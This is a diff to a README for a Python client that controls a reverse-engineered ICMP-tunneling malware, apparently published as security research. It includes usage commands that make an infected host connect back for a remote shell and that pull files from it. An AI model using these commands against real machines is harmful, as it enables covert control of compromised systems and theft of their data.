@@ -1,4 +1,4 @@
-# oci-malware
+# PingBack
 
 This is a client for a malware that we found and reversed engineered that uses ICMP tunneling techniques to evade detection.
 The VirusTotal report for this malware can be found here: https://www.virustotal.com/gui/file/e50943d9f361830502dcfdb00971cbee76877aa73665245427d817047523667f/detection
@@ -14,7 +14,7 @@ Currently only tested on Linux, as scapy sniffer didn't work correctly on Window
 ## Usage
 
 ```
-Usage: ocicli.py [OPTIONS] COMMAND [ARGS]...
+Usage: pingback.py [OPTIONS] COMMAND [ARGS]...
 
 Options:
   --help  Show this message and exit.
@@ -31,11 +31,11 @@ Commands:
 
 This requires obviously a target running the malware. e.g. if malware was running on 192.168.176.131 to run a shell on the target:
 
-`$ python3 ocicli.py --host 192.168.176.131`
+`$ python3 pingback.py --host 192.168.176.131`
 
 This will listen on a random port on the local machine, send an icmp message to the target host with instructions to connect back to the local machine and random port, and establish a shell.
 
-`$ python3 ocicli.py download --host 192.168.176.131 --remote_file c:\\windows\\system32\\win32calc.exe --local_file calc.exe`
+`$ python3 pingback.py download --host 192.168.176.131 --remote_file c:\\windows\\system32\\win32calc.exe --local_file calc.exe`
 
 ## Demo
 
